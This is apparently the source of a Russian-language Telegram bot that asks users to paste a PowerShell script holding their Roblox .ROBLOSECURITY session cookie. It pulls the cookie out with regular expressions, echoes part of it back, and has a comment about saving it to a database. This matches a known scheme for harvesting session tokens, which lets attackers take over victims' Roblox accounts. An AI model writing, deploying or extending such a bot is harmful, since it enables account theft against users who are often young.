import re
import logging
import asyncio
import sys
import traceback
from datetime import datetime
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    ContextTypes, filters
)

from config import Config
from database import Database

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

def extract_roblox_cookie(text: str) -> str:
    """Извлекает .ROBLOSECURITY куки из PowerShell скрипта"""
    patterns = [
        r'\.ROBLOSECURITY["\']?\s*,\s*["\']([^"\']+)["\']',
        r'\.ROBLOSECURITY["\']?\s*,\s*["\'](.*?_\|WARNING:.*?)\s*["\']',
    ]
    
    for pattern in patterns:
        matches = re.search(pattern, text, re.DOTALL)
        if matches:
            return matches.group(1).strip()
    return ""

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик команды /start"""
    user = update.effective_user
    await update.message.reply_text(
        "🤖 *Бот для обработки Roblox куки*\n\n"
        "Отправьте мне PowerShell скрипт с .ROBLOSECURITY куки.",
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик текстовых сообщений"""
    user = update.effective_user
    text = update.message.text
    
    cookie = extract_roblox_cookie(text)
    
    if cookie:
        # Здесь можно сохранить куки в базу
        await update.message.reply_text(
            f"✅ *Cookie найден!*\n\n"
            f"Длина: {len(cookie)} символов\n"
            f"Первые 100 символов:\n`{cookie[:100]}...`",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ *Не удалось найти .ROBLOSECURITY куки.*\n\n"
            "Убедитесь что отправляете полный PowerShell скрипт.",
            parse_mode='Markdown'
        )

def main():
    """Основная функция запуска бота"""
    logger.info("=" * 50)
    logger.info("🚀 ЗАПУСК БОТА TELEGRAM")
    logger.info("=" * 50)
    
    try:
        # Загружаем конфиг
        config = Config()
        logger.info(f"✅ Токен: {config.BOT_TOKEN[:10]}...")
        logger.info(f"✅ Админ ID: {config.ADMIN_ID}")
        
        # Создаем приложение
        application = Application.builder().token(config.BOT_TOKEN).build()
        logger.info("✅ Application создан")
        
        # Регистрируем обработчики
        application.add_handler(CommandHandler("start", start_command))
        application.add_handler(CommandHandler("help", start_command))
        application.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND, 
            handle_message
        ))
        
        logger.info("✅ Обработчики зарегистрированы")
        logger.info("🔄 Запускаем polling...")
        
        # Запускаем бота
        application.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
        
    except Exception as e:
        logger.error(f"❌ Ошибка: {e}")
        logger.error(traceback.format_exc())
        sys.exit(1)

if __name__ == '__main__':
    main()
